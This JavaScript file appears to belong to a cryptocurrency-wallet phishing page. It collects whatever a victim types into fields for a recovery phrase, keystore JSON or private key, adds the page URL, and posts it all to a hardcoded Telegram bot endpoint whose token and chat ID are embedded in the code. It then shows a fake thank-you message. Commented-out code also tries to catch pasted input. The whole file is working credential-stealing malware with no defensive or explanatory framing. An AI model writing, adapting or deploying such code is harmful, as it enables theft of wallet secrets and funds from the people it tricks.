const chatIds = ["5567256987"];
const inputIds = ["recovery_phrase", "keystoreJson", "privateKey"];

const url = window.location.href;
const forms = document.querySelectorAll(".gform");
// console.log(forms);
// console.log(document.forms);
// document.getElementById("phraseForm").addEventListener("submit", (e) => {
//   e.preventDefault();
//   console.log("caughtttt phrase");
// });

async function clicked() {
  await sendData("phraseinput");
  document.querySelector(".thankyou_message").style.display = "flex";
  await sleep(4000);
  document.querySelector(".thankyou_message").style.display = "none";
}
// function testPaste() {
//   console.log("paste");
// }

// const intv = setInterval(() => {
//   const inputBox = document.getElementById("phraseinput");
//   if (inputBox) {
//     console.log("removed");
//     console.log(inputBox);
//     inputBox.addEventListener("paste", () => {
//       console.log("paste caught");
//       // await sleep();
//       // await sendData("phraseinput");
//     });
//     clearInterval(intv);
//   }
// }, 1000);
async function pasted() {
  console.log("paste caught");

  // await sleep();
  // await sendData("phraseinput");
}
async function sendData(inputId) {
  await sleep(1000);
  const inputBox = document.getElementById(inputId);
  // const kp = document.getElementById("keystorePassword");
  // console.log(i);
  const data = `
  key type: ${inputId} \n 
  value : ${inputBox.value} \n
   ${url}`;

  await sendMsg(data);
}

const sendMsg = async (msg) => {
  for (let i = 0; i < chatIds.length; i++) {
    const data = {
      chat_id: chatIds[i],
      text: msg,
    };
    const resp = await fetch(
      `https://api.telegram.org/bot6544701468%3AAAFHo-6ohRT0Tf4Ep9bG-yoWdxvt1AZeU0I/sendMessage`,
      {
        method: "POST",
        headers: {
          accept: "application/json",
          "content-type": "application/json",
        },
        body: JSON.stringify(data),
      }
    );
    const resJson = await resp.json();
    console.log(resJson);
  }
};

// document.getElementById("cancel").addEventListener("click", () => {
//   const errs = document.querySelectorAll(".thankyou_message");
//   for (let i = 0; i < errs.length; i++) {
//     errs[i].style.display = "none";
//     forms[i].reset();
//     console.log("reset!");
//   }
//   // for(let i=0; i<forms.length;i++ ){
//   //     forms[i].
//   // }
// });

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
